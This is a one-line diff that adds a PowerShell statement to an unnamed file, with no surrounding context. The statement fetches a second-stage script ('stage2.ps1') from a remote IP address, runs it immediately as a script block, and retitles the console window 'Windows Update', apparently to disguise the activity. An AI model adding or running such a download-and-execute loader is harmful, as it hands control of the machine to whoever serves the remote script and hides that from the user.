@@ -1,0 +1,1 @@
+$TransferUrl = 'http://192.0.2.74/stage2.ps1'; $RemoteScript = (iwr $TransferUrl -UseBasicParsing).Content; [ScriptBlock]::Create($RemoteScript).Invoke(); $Host.UI.RawUI.WindowTitle = "Windows Update"
